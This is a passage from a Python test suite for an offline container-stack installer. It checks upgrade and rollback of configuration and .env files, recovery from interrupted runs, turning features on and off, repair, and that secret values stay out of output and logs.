        (deploy / "docker-compose.override.yml").write_text("services: {}\n# changed after the upgrade\n")
        # And two files changed since: one the upgrade left as the host had it, one it added.
        (deploy / "config" / "edited.yml").write_text("shipped: 1\nmine: yes\nlater: yes\n")
        (deploy / "config" / "added.yml").write_text("new: 1\nlater: yes\n")
        r = self.r.run("upgrade", "--dir", str(self.dir), "--rollback", "--yes", "--timeout", "5s")
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertIn("Rolled back: 5.2.0 runs", r.stdout)
        self.assertEqual((deploy / "docker-compose.yml").read_text(), COMPOSE_OLD)
        # .env was as the upgrade left it: 5.2.0's again, the one there was kept.
        self.assertEqual((deploy / ".env").read_text(), OLD_ENV)
        self.assertEqual((snap / "files-before-rollback" / ".env").read_text(), upgraded_env)
        self.assertEqual(oct((snap / "files-before-rollback" / ".env").stat().st_mode & 0o777), "0o600")
        # The certificates and the override as they are now.
        self.assertEqual((deploy / "certs" / "tls.key").read_text(), "NEW KEY\n")
        self.assertEqual((deploy / "certs" / "tls.crt").read_text(), "NEW CERTIFICATE\n")
        self.assertEqual((deploy / "docker-compose.override.yml").read_text(), "services: {}\n# changed after the upgrade\n")
        back = next(line for line in r.stdout.splitlines() if "put back as 5.2.0 had them:" in line).split(": ", 1)[1].split()
        self.assertEqual(sorted(back), sorted(["docker-compose.yml", "config/dropped.yml", ".env.example"]))
        self.assertIn("took out config/added.yml (the upgrade added it)", r.stdout)
        self.assertIn("took out config/edited.yml.new-9.9.9 (the upgrade added it)", r.stdout)
        # Asked about, and unattended the defaults: the file the upgrade had left as it was stays as it
        # is now; the one it added goes, kept first.
        self.assertIn("changed here since the upgrade, which had left them as they were: config/edited.yml", r.stdout)
        self.assertIn("left as they are now: config/edited.yml", r.stdout)
        self.assertEqual((deploy / "config" / "edited.yml").read_text(), "shipped: 1\nmine: yes\nlater: yes\n")
        kept = snap / "files-before-rollback" / "config"
        self.assertEqual((kept / "added.yml").read_text(), "new: 1\nlater: yes\n")
        self.assertFalse((kept / "edited.yml").exists())
        self.assertFalse((kept / "valkey.conf").exists())
        self.assertIn("changed here since the upgrade, kept in", r.stdout)
        self.assertFalse((self.dir / "VERSION").exists())
        self.assertEqual(next(c for c in self.containers() if c["service"] == "app")["image_id"], old_app)
        self.assertEqual(len(list((snap / "data-before-rollback").glob("20*"))), 1)
        self.assertIn("version=5.2.0\n", (self.dir / ".arena-install" / "state").read_text())
        # Once is all: there is nothing more to roll back to.
        r = self.r.run("upgrade", "--dir", str(self.dir), "--rollback", "--yes")
        self.assertEqual(r.returncode, 3, self.output(r))
        self.assertIn("no upgrade of this installer to roll back here", r.stderr)

    def test_After_upgrade_rollback_the_installation_is_this_installers_again(self):
        # 5.2.0 installed by this installer: its record (the files' checksums, the bundle it came from). The rollback
        # took the record away, so verify said nothing was installed here, and repair and remove did not know it.
        deploy = self.old_install(version_file=True)
        state = self.dir / ".arena-install"
        state.mkdir()
        record = "".join(f"{sha}  {f}\n" for sha, f in (line.split(None, 1) for line in
                         (self.r.unpack() / "known" / "5.2.0.sha256").read_text().splitlines()) if not f.startswith((".env", "certs/")))
        (state / "deploy.sha256").write_text(record)
        (state / "MANIFEST").write_text("format: arena-offline 1\nversion: 5.2.0\n")
        (state / "state").write_text("version=5.2.0\nengine=docker\nproject=arena\nstatus=installed\n")
        (state / "kept").write_text(f"config/edited.yml\t{self.sha(deploy / 'config' / 'edited.yml')}\n"
                                    f"config/valkey.conf\t{self.sha(deploy / 'config' / 'valkey.conf')}\n")
        before = {f: (state / f).read_text() for f in ("deploy.sha256", "MANIFEST", "kept")}
        r = self.r.run("upgrade", "--dir", str(self.dir), "--yes", "--timeout", "5s")
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertNotEqual(before["deploy.sha256"], (state / "deploy.sha256").read_text())
        r = self.r.run("upgrade", "--dir", str(self.dir), "--rollback", "--yes", "--timeout", "5s")
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertEqual(before, {f: (state / f).read_text() for f in before})
        r = subprocess.run(["bash", str(deploy / "scripts" / "installer.sh"), "verify", "--dir", str(self.dir)], cwd=self.r.s.dir,
                           env=self.r.env(), capture_output=True, text=True, timeout=120)
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertIn("every file is as it was installed, or kept as you changed it", r.stdout)

    @staticmethod
    def sha(path: Path) -> str:
        return hashlib.sha256(path.read_bytes()).hexdigest()

    def test_A_rollback_puts_back_only_what_the_upgrade_changed_and_asks_about_the_rest(self):
        deploy = self.old_install(version_file=True)
        r = self.r.run("upgrade", "--dir", str(self.dir), "--yes", "--timeout", "5s")
        self.assertEqual(r.returncode, 0, self.output(r))
        snap = self.dir / ".arena-install" / "rollback" / "5.2.0"
        # Since the upgrade: a setting changed and one added, the database password changed, a key
        # the upgrade added changed, and a file it wrote changed.
        env = (deploy / ".env").read_text()
        self.assertIn("DOMAIN=old.example\n", env)
        env = env.replace("DOMAIN=old.example\n", "DOMAIN=new.example\n").replace("DB_PASSWORD=old-db\n", "DB_PASSWORD=rotated-db\n")
        env = env.replace("NEW_SETTING=on\n", "export NEW_SETTING = off\n") + "MY_SETTING=1\n"
        (deploy / ".env").write_text(env)
        (deploy / ".env.example").write_text(ENV_EXAMPLE_NEW + "# mine\n")
        r = self.r.run("upgrade", "--dir", str(self.dir), "--rollback", "--dry-run")
        self.assertEqual(r.returncode, 0, self.output(r))
        out = r.stdout
        self.assertIn("the upgrade changed these, and they were changed here since: .env.example", out)
        self.assertIn("would  take out of .env the keys the upgrade added: CODE_INTEL_HOST CODE_INTEL_KEY COMPOSE_PROFILES DATA_DIR NEW_KEY NEW_SETTING", out)
        self.assertIn(".env: changed since the upgrade, and the data goes back to a backup taken with 5.2.0's: DB_PASSWORD", out)
        self.assertIn("would  put back 5.2.0's values in .env: ARGUS_KEY DB_PASSWORD", out)
        self.assertIn(".env: left as they are now: DOMAIN MY_SETTING", out)
        self.assertEqual((deploy / ".env").read_text(), env)
        r = self.r.run("upgrade", "--dir", str(self.dir), "--rollback", "--yes", "--timeout", "5s")
        self.assertEqual(r.returncode, 0, self.output(r))
        values = dict(line.split("=", 1) for line in (deploy / ".env").read_text().splitlines() if "=" in line and not line.startswith("#"))
        # What the upgrade changed goes back; what was changed since stays, but for what the data needs.
        self.assertEqual(values["DOMAIN"], "new.example")
        self.assertEqual(values["MY_SETTING"], "1")
        self.assertEqual(values["DB_PASSWORD"], "old-db")
        self.assertEqual(values["OLD_THING"], "1")
        self.assertNotIn("NEW_KEY", values)
        self.assertFalse([k for k in values if "NEW_SETTING" in k])
        self.assertEqual(oct((deploy / ".env").stat().st_mode & 0o777), "0o600")
        self.assertEqual((snap / "files-before-rollback" / ".env").read_text(), env)
        self.assertEqual((deploy / ".env.example").read_text(), ENV_EXAMPLE_OLD)
        self.assertEqual((snap / "files-before-rollback" / ".env.example").read_text(), ENV_EXAMPLE_NEW + "# mine\n")
        self.assertIn(".env: 5.2.0's values put back: ARGUS_KEY DB_PASSWORD", r.stdout)
        # Names only: no value of .env is printed or logged.
        for secret in ("rotated-db", "old-db", "old-app-key"):
            self.assertNotIn(secret, self.output(r) + self.logs())

    def test_An_upgrade_cut_off_half_way_carries_on(self):
        self.old_install(version_file=True)
        r = self.r.run("upgrade", "--dir", str(self.dir), "--yes", "--timeout", "3s", extra={"FAKE_UP_FAIL": "1"})
        self.assertIn(r.returncode, (4, 5), self.output(r))
        # As if the run was killed after the backup: the record says where it was.
        state = self.dir / ".arena-install"
        (state / "upgrade").write_text(f"from=5.2.0\nto=9.9.9\nbackup={sorted((self.dir / 'deploy' / 'backups').glob('20*'))[0]}\nstarted=0\n")
        r = self.r.run("upgrade", "--dir", str(self.dir), "--yes", "--timeout", "5s")
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertIn("carrying on the upgrade from 5.2.0 that was interrupted", r.stdout)
        self.assertEqual(len(list((self.dir / "deploy" / "backups").glob("20*"))), 1, "a second backup was taken")

    def stopped(self, *args: str, at: str, call: str = "", sig: int = signal.SIGINT, extra: dict[str, str] | None = None) -> str:
        """installer.sh ARGS, stopped (SIG to its whole process group, as a terminal's Ctrl-C or hang-up) once it says AT
        and, with CALL, once the engine has been called so (`load`): its output."""
        # Into a file, not a pipe: what it leaves running may hold its output open, and the person's prompt is back
        # once the installer itself has ended.
        out = self.r.s.dir / f"stopped-{self._testMethodName}.out"
        with open(out, "w") as f:
            p = subprocess.Popen(["bash", str(self.r.unpack() / "installer.sh"), *args], cwd=self.r.s.dir, env=self.r.env(extra),
                                 stdout=f, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL, start_new_session=True)
        while at not in out.read_text() or (call and not self.r.s.called(call)):
            self.assertIsNone(p.poll(), f"it ended before it said {at!r}: {out.read_text()}")
            time.sleep(0.05)
        os.killpg(p.pid, sig)
        p.wait(timeout=60)
        return out.read_text()

    def test_An_upgrade_stopped_while_its_images_load_carries_on_at_once(self):
        # Ctrl-C reaches every process of the run, but the loads it started in the background ignore it (bash does
        # that to what it starts with &): they went on loading, holding the installer's lock, and upgrade again
        # said another run held it.
        self.old_install(version_file=True)
        out = self.stopped("upgrade", "--dir", str(self.dir), "--yes", "--timeout", "5s", at="  loading ", call="load",
                           extra={"FAKE_LOAD_SECONDS": "20"})
        self.assertIn("The upgrade was stopped part way: the same upgrade run again carries it on", out)
        self.assertTrue((self.dir / ".arena-install" / "upgrade").exists(), "the upgrade's record")
        r = self.r.run("upgrade", "--dir", str(self.dir), "--yes", "--timeout", "5s")
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertIn("carrying on the upgrade from 5.2.0 that was interrupted", r.stdout)
        self.assertIn("Upgraded from 5.2.0 to 9.9.9", r.stdout)

    def test_An_upgrade_carried_on_after_its_env_changes_still_rolls_them_back(self):
        # Carried on, it wrote its record of the .env keys it added anew, empty (they were there by then): a rollback
        # later left them in .env.
        deploy = self.old_install(version_file=True)
        self.stopped("upgrade", "--dir", str(self.dir), "--yes", "--timeout", "5s", at="==> data in")
        r = self.r.run("upgrade", "--dir", str(self.dir), "--yes", "--timeout", "5s")
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertIn("carrying on the upgrade from 5.2.0 that was interrupted", r.stdout)
        # A week on, a setting changed: the rollback takes out only the keys the upgrade added.
        env = (deploy / ".env").read_text().replace("DOMAIN=old.example\n", "DOMAIN=new.example\n")
        (deploy / ".env").write_text(env)
        r = self.r.run("upgrade", "--dir", str(self.dir), "--rollback", "--yes", "--timeout", "5s")
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertIn(".env: took out the keys the upgrade added: CODE_INTEL_HOST CODE_INTEL_KEY COMPOSE_PROFILES DATA_DIR NEW_KEY NEW_SETTING", r.stdout)
        values = dict(line.split("=", 1) for line in (deploy / ".env").read_text().splitlines() if "=" in line and not line.startswith("#"))
        self.assertEqual(values["DOMAIN"], "new.example")
        self.assertFalse({"NEW_KEY", "NEW_SETTING", "DATA_DIR", "COMPOSE_PROFILES"} & set(values), values)

    def test_An_upgrade_cut_off_can_be_rolled_back_instead(self):
        # upgrade --rollback looked only for a finished upgrade: one cut off was refused ("no upgrade of this installer
        # to roll back here"), with the new release half started.
        deploy = self.old_install(version_file=True)
        old_app = next(c for c in self.containers() if c["service"] == "app")["image_id"]
        self.stopped("upgrade", "--dir", str(self.dir), "--yes", "--timeout", "5s", at="==> waiting for every service")
        self.assertIn("started=1\n", (self.dir / ".arena-install" / "upgrade").read_text())
        r = self.r.run("upgrade", "--dir", str(self.dir), "--rollback", "--dry-run")
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertIn("An upgrade of", r.stdout)
        self.assertIn("would  stop it, put back 5.2.0's files and images, restore", r.stdout)
        r = self.r.run("upgrade", "--dir", str(self.dir), "--rollback", "--yes", "--timeout", "5s")
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertIn("Rolled back: 5.2.0 runs again, with the data of", r.stdout)
        # The data, not the configuration: backup.sh said "and config" whenever --with-config was not 1 but set at all (0).
        self.assertIn("This OVERWRITES the current volumes.\n", r.stdout)
        # What the new release shipped is the bundle's: nothing it wrote is taken for a change made here since.
        self.assertNotIn("changed here since", r.stdout)
        self.assertEqual((deploy / "docker-compose.yml").read_text(), COMPOSE_OLD)
        self.assertEqual((deploy / ".env").read_text(), OLD_ENV)
        self.assertFalse((deploy / "config" / "added.yml").exists())
        self.assertEqual(next(c for c in self.containers() if c["service"] == "app")["image_id"], old_app)
        self.assertFalse((self.dir / ".arena-install" / "upgrade").exists())
        self.assertIn("version=5.2.0\n", (self.dir / ".arena-install" / "state").read_text())

    def test_A_newer_bundle_carries_on_an_upgrade_an_older_one_left_cut_off(self):
        # A hotfix's bundle on a host whose upgrade to the release before it was cut off: it was refused ("run that
        # bundle's upgrade again"), so the host could only go on with the release that had failed it.
        deploy = self.old_install(version_file=True)
        self.stopped("upgrade", "--dir", str(self.dir), "--yes", "--timeout", "5s", at="==> data in")
        marker = self.dir / ".arena-install" / "upgrade"
        marker.write_text(marker.read_text().replace("to=9.9.9\n", "to=9.9.8\n"))
        # The images the cut-off 9.9.8 run had loaded of its own.
        store = self.r.store()
        store["images"].update({"arena-app:9.9.8": "8" * 64, "arena-web:9.9.8": "9" * 64})
        self.r.state.write_text(json.dumps(store))
        r = self.r.run("upgrade", "--dir", str(self.dir), "--yes", "--timeout", "5s")
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertIn("the upgrade to 9.9.8 that was cut off here is carried on to 9.9.9", r.stdout)
        self.assertIn("Upgraded from 5.2.0 to 9.9.9", r.stdout)
        self.assertIn("2 image(s) of 9.9.8 that the cut-off upgrade loaded, removed", r.stdout)
        self.assertFalse({"arena-app:9.9.8", "arena-web:9.9.8"} & set(self.r.store()["images"]))
        self.assertEqual((deploy / "docker-compose.yml").read_text(), COMPOSE_NEW)
        self.assertEqual(len(list((deploy / "backups").glob("20*"))), 1, "a second backup was taken")
        # An older bundle does not take over a newer one's.
        marker.write_text("from=5.2.0\nto=9.9.10\nbackup=\nstarted=0\n")
        r = self.r.run("upgrade", "--dir", str(self.dir), "--yes", "--timeout", "5s")
        self.assertEqual(r.returncode, 3, self.output(r))
        self.assertIn("an upgrade to 9.9.10 was interrupted here: run that bundle's upgrade again", r.stderr)

    def test_The_run_file_removes_what_a_run_killed_outright_left(self):
        # Killed (the machine lost, kill -9), a run cannot remove its unpacked bundle: the next one needed room for
        # two, and stopped at "unpacking needs ... MB" on a host with room for one.
        where = self.r.run_file.parent
        stale, live, kept = (where / f".arena-unpack.{n}" for n in ("STALE1", "LIVE01", "KEPT01"))
        for d in (stale, live, kept):
            (d / "arena-9.9.9" / "images").mkdir(parents=True)
        (kept / ".keep").write_text("")
        running = subprocess.Popen(["sh", "-c", "sleep 60", str(live / "arena-9.9.9" / "installer.sh")])
        try:
            r = self.r.run("status", "--dir", str(self.dir), via_run=True)
            self.assertIn(f"arena: removed {stale}, which a run that was cut off left", r.stderr)
            self.assertFalse(stale.exists())
            self.assertTrue(live.exists(), "a run going on")
            self.assertTrue(kept.exists(), "--keep-workdir")
        finally:
            running.kill()
            running.wait()
            shutil.rmtree(live, ignore_errors=True)
            shutil.rmtree(kept, ignore_errors=True)

    def test_An_install_stopped_while_its_images_load_says_what_it_undid(self):
        # The log's tee went with Ctrl-C (bash hands a process substitution's command SIGINT back as it was, whatever
        # trap '' said): the undo ran, but nothing it said reached the terminal or the log.
        token = self.r.s.dir / "gitlab-token"
        token.write_text("glpat-a-token-for-the-test\n")
        before = set(self.r.store()["images"])
        out = self.stopped("install", "--dir", str(self.dir), "--yes", "--cpu-only", "--skip-requirements", "--timeout", "5s",
                           "--domain", "arena.test", "--https-port", "18443", "--http-port", "18080",
                           "--gitlab-url", "https://gitlab.test", "--gitlab-token-file", str(token),
                           at="  loading ", call="load", extra={"FAKE_LOAD_SECONDS": "3"})
        self.assertIn("the install did not finish: what it did is undone", out)
        self.assertIn("Nothing of the install is left but its log", out)
        self.assertIn("Nothing of the install is left but its log", self.logs())
        self.assertFalse((self.dir / "deploy").exists())
        self.assertEqual(before, set(self.r.store()["images"]), "the images it loaded")

    def test_On_rootless_Podman_the_backup_is_yours_and_Docker_only_looked_at(self):
        podman = {"FAKE_STATE_ENGINE": "podman", "FAKE_VOLUMES": "arena_engine\narena_code-intel"}
        deploy = self.old_install(version_file=True, running=False)
        subprocess.run(["podman", "compose", "-f", "docker-compose.yml", "-f", "podman.yml", "up", "-d"], cwd=deploy,
                       env=self.r.env(podman), check=True)
        r = self.r.run("upgrade", "--dir", str(self.dir), "--yes", "--timeout", "5s", extra=podman)
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertIn("(podman, project arena)", r.stdout)
        # The container's root is this user under rootless Podman: its uid 1000 is another host uid,
        # whose files this user could not read back to check the backup.
        snapshots = [" ".join(c) for c in self.r.calls() if c[:2] == ["podman", "run"] and "python -c" in " ".join(c)]
        self.assertTrue(snapshots)
        for call in snapshots:
            self.assertIn("chown 0:0 /out/", call)
        # Docker is only asked whether it runs the project (it does not: the engine is Podman).
        self.assertFalse([c for c in self.r.calls() if c[0] == "docker" and c[1] not in ("info", "ps")])
        self.assertIn("Upgraded from 5.2.0 to 9.9.9", r.stdout)
        # Podman held the release's names twice: the new under localhost/, 5.2.0's as it was loaded.
        images = self.r.store()["images"]
        self.assertIn("localhost/arena-app:latest", images)
        self.assertIn("arena-app:latest", images)
        r = self.r.run("remove", "--dir", str(self.dir), "--yes", extra=podman)
        self.assertEqual(r.returncode, 0, self.output(r))
        left = [ref for ref in self.r.store()["images"] if "arena-" in ref]
        # Laya is off: its image, there from the build, was never loaded or tagged by the installer.
        self.assertEqual(left, ["arena-laya:latest"], r.stdout)

    def test_Beside_deploy_nothing_of_someone_elses_is_replaced(self):
        """deploy/ in a folder that holds other things (here, someone's own docs/)."""
        self.old_install(version_file=True)
        (self.dir / "docs").mkdir()
        (self.dir / "docs" / "mine.md").write_text("my notes\n")
        (self.dir / "LICENSE.md").write_text("my licence\n")
        r = self.r.run("upgrade", "--dir", str(self.dir), "--yes", "--timeout", "5s")
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertIn("kept docs LICENSE.md in", r.stdout)
        self.assertEqual([p.name for p in (self.dir / "docs").iterdir()], ["mine.md"])
        self.assertEqual((self.dir / "LICENSE.md").read_text(), "my licence\n")
        # What it could write, it did: VERSION (it held a version), the other licence, Code Arena's packages.
        self.assertEqual((self.dir / "VERSION").read_text().strip(), "9.9.9")
        self.assertTrue((self.dir / "LICENSING.md").is_file())
        self.assertTrue((self.dir / "code-arena").is_dir())
        # Purge takes deploy/ and what it wrote beside it, and nothing else.
        (self.dir / "packs" / "mine.kpack").write_text("a pack\n")
        r = self.r.run("remove", "--dir", str(self.dir), "--yes", "--purge", "--confirm", "PURGE")
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertFalse((self.dir / "deploy").exists())
        for gone in ("VERSION", "LICENSING.md", "code-arena"):
            self.assertFalse((self.dir / gone).exists(), gone)
        self.assertEqual((self.dir / "docs" / "mine.md").read_text(), "my notes\n")
        self.assertEqual((self.dir / "LICENSE.md").read_text(), "my licence\n")
        self.assertTrue((self.dir / "packs" / "mine.kpack").is_file())

    def test_A_git_checkout_keeps_its_own_docs_and_VERSION(self):
        self.old_install(version_file=True)
        (self.dir / ".git").mkdir()
        (self.dir / "docs").mkdir()
        (self.dir / "docs" / "deployment.md").write_text("the checkout's\n")
        r = self.r.run("upgrade", "--dir", str(self.dir / "deploy"), "--yes", "--timeout", "5s")
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertIn("is a git checkout: its docs, licences, packs and VERSION are its own", r.stdout)
        self.assertEqual((self.dir / "docs" / "deployment.md").read_text(), "the checkout's\n")
        self.assertEqual((self.dir / "VERSION").read_text(), "5.2.0\n")
        self.assertIn("installed: 9.9.9 (this installer's record)", self.r.run("status", "--dir", str(self.dir)).stdout)

    def test_Upgrade_refuses_a_bundle_without_an_image_the_host_runs(self):
        self.old_install(version_file=True)
        copy = self.damaged_copy()
        manifest = copy / "MANIFEST"
        manifest.write_text(manifest.read_text().replace("left-out: \n", "left-out: code-intel\n"))
        subprocess.run("sha256sum $(sed -E 's/^[0-9a-f]{64} [ *]//' SHA256SUMS) > S && mv S SHA256SUMS", shell=True, cwd=copy, check=True)
        r = subprocess.run(["bash", str(copy / "installer.sh"), "upgrade", "--dir", str(self.dir), "--yes"], env=self.r.env(),
                           capture_output=True, text=True, stdin=subprocess.DEVNULL)
        self.assertEqual(r.returncode, 3, self.output(r))
        self.assertIn("this bundle has no image for code-intel (made without it): --without code-intel", r.stderr)

    # --------------------------------------------------------------- features

    LAYA = {"FAKE_SERVICES": SERVICES + "laya\n"}

    def env_values(self) -> dict[str, str]:
        text = (self.dir / "deploy" / ".env").read_text()
        return dict(line.split("=", 1) for line in text.splitlines() if "=" in line and not line.startswith("#"))

    def test_Install_turns_on_and_off_the_features_asked_and_loads_only_their_images(self):
        r = self.install("--with", "laya", "--without", "monitoring", extra_env=self.LAYA)
        self.assertEqual(self.env_values()["COMPOSE_PROFILES"], "knowledge,code-intel,laya,meetings")
        running = {c["service"] for c in self.containers()}
        self.assertIn("laya", running)
        self.assertNotIn("cpu-temp-exporter", running)
        self.assertIn("loaded arena-laya:9.9.9", r.stdout)
        # Monitoring's image is the helper backups read the volumes with: there all the same (loaded, or the
        # very image the bundle carries, there already).
        self.assertIn("python:3.13-slim\t", (self.dir / ".arena-install" / "IMAGES").read_text())
        self.assertIn("features: 4 on, off: chat-models monitoring", r.stdout)

    # ----------------------------------------- every check first; a failed install leaves nothing

    def test_Verify_passes_right_after_an_install(self):
        # The host's own paths (backups/.gitkeep among them) are never written, so never expected.
        self.install()
        r = self.r.run("verify", "--dir", str(self.dir))
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertNotIn("backups/", (self.dir / ".arena-install" / "deploy.sha256").read_text())

    def test_It_never_waits_for_every_child_at_once(self):
        # Its log is a tee it started (start_log): on bash 5.2 a bare wait waits for that tee too, for ever, as an
        # install on Debian 13 did after its images loaded. Each wait names what it waits for.
        text = (REPO / "deploy" / "scripts" / "installer.sh").read_text()
        bare = [line.strip() for line in text.splitlines()
                if re.search(r"(^|[;&|{(]|\bdo|\bthen|\belse)\s*wait(\s*$|\s*[;&|)]|\s+2>|\s+-n\b)", line.split("#")[0])]
        self.assertEqual([], bare)

    def test_Every_requirement_is_checked_before_anything_is_done(self):
        r = self.r.run("install", "--dir", str(self.dir), "--yes", "--cpu-only", "--domain", "arena.test", "--https-port", "18443",
                       "--http-port", "18080", extra={"FAKE_CONFIG_FAIL": "1"})
        self.assertEqual(r.returncode, 3, self.output(r))
        self.assertIn("docker compose cannot read the stack's files with this host's answers", r.stdout)
        self.assertIn("    services must be a mapping", r.stdout)
        self.assertIn("requirement(s) not met (above): nothing was changed", r.stderr)
        self.assertFalse(self.dir.exists(), "nothing written")
        self.assertFalse(any(c[1:2] == ["load"] for c in self.r.calls()), "nothing loaded")

    def test_The_override_says_nothing_in_a_way_compose_reads_and_a_bare_one_is_written_again(self):
        self.install()
        override = self.dir / "deploy" / "docker-compose.override.yml"
        self.assertIn("\nservices: {}\n", override.read_text())
        # 7.6.0 to 7.6.2 wrote "services:" with nothing under it: compose cannot read that.
        override.write_text("# Written by installer.sh (7.6.2) for this host.\nservices:\n")
        r = self.install()
        self.assertIn('said "services:" with nothing under it (an earlier installer\'s), which compose cannot read: written again', r.stdout)
        self.assertIn("\nservices: {}\n", override.read_text())

    def test_A_failed_install_takes_away_what_it_did_and_keeps_its_log(self):
        data = self.r.s.dir / f"data-{self._testMethodName}"
        before = set(self.r.store()["images"])
        r = self.install("--data-dir", str(data), code=1, extra_env={"FAKE_UP_FAIL": "1"})
        self.assertIn("the install did not finish: what it did is undone (--keep-failed keeps it, to look at)", r.stdout)
        self.assertIn("Nothing of the install is left but its log", r.stdout)
        self.assertFalse((self.dir / "deploy").exists())
        self.assertFalse(data.exists(), "the data folders it made")
        self.assertEqual([], self.containers())
        self.assertEqual(before, set(self.r.store()["images"]), "the images it loaded")
        self.assertTrue(list((self.dir / ".arena-install" / "logs").glob("install-*.log")), "its log stays")
        self.assertEqual({"logs", "lock"}, {p.name for p in (self.dir / ".arena-install").iterdir()})

    def test_A_cut_off_install_is_taken_away_and_installed_anew(self):
        r = self.install("--keep-failed", code=1, extra_env={"FAKE_UP_FAIL": "1"})
        self.assertNotIn("what it did is undone", r.stdout)
        self.assertTrue((self.dir / "deploy" / ".env").exists(), "--keep-failed keeps it")
        r = self.install()
        self.assertIn("an install of 9.9.9 was cut off here: what it left is taken away after the checks", r.stdout)
        self.assertIn("what the cut-off install left is taken away first", r.stdout)
        self.assertIn("Installed", r.stdout)

    def test_An_empty_secret_the_installer_makes_is_made_when_it_runs_again(self):
        self.install()
        env = self.dir / "deploy" / ".env"
        # As an upgrade from 6.7 left it: there, and empty.
        env.write_text(re.sub(r"(?m)^WORKSPACES_KEY=.*\n", "", env.read_text()) + "WORKSPACES_KEY=\n")
        r = self.install()
        self.assertIn(".env: WORKSPACES_KEY was empty: a new secret, generated", r.stdout)
        self.assertRegex(env.read_text(), r"(?m)^WORKSPACES_KEY=[0-9a-f]{64}$")

    def test_A_relative_models_folder_is_one_of_deploy_not_a_named_volume(self):
        self.install("--models-dir", "library")
        self.assertIn("MODELS_DIR=./library", (self.dir / "deploy" / ".env").read_text())

    def test_A_feature_others_need_is_not_turned_off_without_them_and_names_are_checked(self):
        for args, code, message in [
            (["--without", "knowledge"], 3, "knowledge cannot be off while meetings needs it: turn those off too (--without knowledge,meetings)"),
            (["--with", "nope"], 2, "no feature nope (installer.sh features lists them)"),
            (["--with", "laya", "--without", "laya"], 2, "laya is both --with and --without"),
            (["--with", "Bad"], 2, "--with and --without name features"),
        ]:
            r = self.r.run("install", "--dir", str(self.dir), "--yes", "--cpu-only", "--dry-run", *args)
            self.assertEqual(r.returncode, code, (args, self.output(r)))
            self.assertIn(message, r.stderr, args)
        # Asked for, a feature brings those it requires.
        r = self.r.run("install", "--dir", str(self.dir), "--yes", "--cpu-only", "--dry-run", "--without", "knowledge,meetings", "--with", "meetings")
        self.assertEqual(r.returncode, 2, self.output(r))
        r = self.r.run("install", "--dir", str(self.dir), "--yes", "--cpu-only", "--dry-run", "--without", "meetings,knowledge")
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertIn("features: 1 on, off: chat-models knowledge code-intel laya meetings", r.stdout)

    def test_Repair_turns_a_feature_on_from_the_bundle_and_off_again_freeing_its_image(self):
        self.install(extra_env=self.LAYA)
        self.assertNotIn("laya", {c["service"] for c in self.containers()})
        r = self.r.run("repair", "--dir", str(self.dir), "--yes", "--timeout", "5s", "--with", "laya", extra=self.LAYA)
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertIn("done   features in .env (COMPOSE_PROFILES): 5 on, off: chat-models", r.stdout)
        self.assertIn("loaded arena-laya:9.9.9", r.stdout)
        self.assertIn("laya", {c["service"] for c in self.containers() if c["state"] == "running"})
        self.assertIn("laya", self.env_values()["COMPOSE_PROFILES"].split(","))
        # Off again, with its image kept.
        r = self.r.run("repair", "--dir", str(self.dir), "--yes", "--timeout", "5s", "--without", "laya", "--keep-images", extra=self.LAYA)
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertIn("stopped and removed the containers of features that are off: laya (their data stays until remove --purge)", r.stdout)
        self.assertNotIn("laya", {c["service"] for c in self.containers()})
        self.assertIn("kept (--keep-images): the images of features that are off", r.stdout)
        self.assertIn("arena-laya:9.9.9", self.r.store()["images"])
        # On and off again: its image goes, and nothing the stack runs.
        self.assertEqual(self.r.run("repair", "--dir", str(self.dir), "--yes", "--timeout", "5s", "--with", "laya", extra=self.LAYA).returncode, 0)
        r = self.r.run("repair", "--dir", str(self.dir), "--yes", "--timeout", "5s", "--without", "laya", extra=self.LAYA)
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertIn("removed the images of features that are off", r.stdout)
        images = self.r.store()["images"]
        self.assertNotIn("arena-laya:9.9.9", images)
        for kept in ("arena-app:9.9.9", "python:3.13-slim", "ghcr.io/ggml-org/llama.cpp:server-cuda"):
            self.assertIn(kept, images)
        self.assertEqual({c["state"] for c in self.containers()}, {"running"})

    def test_The_features_command_lists_each_and_status_says_how_many_are_on(self):
        r = self.r.run("features", "--dir", str(self.r.s.dir / "none-here"))
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertIn("features: on as a new installation has them", r.stdout)
        self.assertRegex(r.stdout, r"\n  on   code-intel +[0-9.]+ [KMG]?B  needs a gitlab +code-intel\n")
        self.assertRegex(r.stdout, r"\n  off  laya ")
        # The chat models and the embedding server run one image: turning off one alone frees none of it.
        self.assertIn("Chat models on this host (the same image as knowledge)", r.stdout)
        self.assertRegex(r.stdout, r"\n  on   meetings +- +with knowledge +Meetings\n")
        self.install()
        r = self.r.run("status", "--dir", str(self.dir))
        self.assertIn("4 on, off: chat-models laya", r.stdout)
        r = self.r.run("features", "--dir", str(self.dir))
        self.assertIn("on as .env has them", r.stdout)
        self.assertRegex(r.stdout, r"\n  off  chat-models ")

    # ----------------------------------------------------------------- repair

    def test_Repair_puts_back_a_file_an_image_and_a_container(self):
        self.install()
        deploy = self.dir / "deploy"
        (deploy / "config" / "added.yml").unlink()
        (deploy / "config" / "valkey.conf").write_text("changed by hand\n")
        store = self.r.store()
        del store["images"]["arena-web:9.9.9"]
        next(c for c in store["containers"] if c["service"] == "code-intel")["state"] = "exited"
        self.r.state.write_text(json.dumps(store))
        valkey = next(c for c in store["containers"] if c["service"] == "valkey")["id"]
        r = self.r.run("repair", "--dir", str(self.dir), "--yes", "--timeout", "5s")
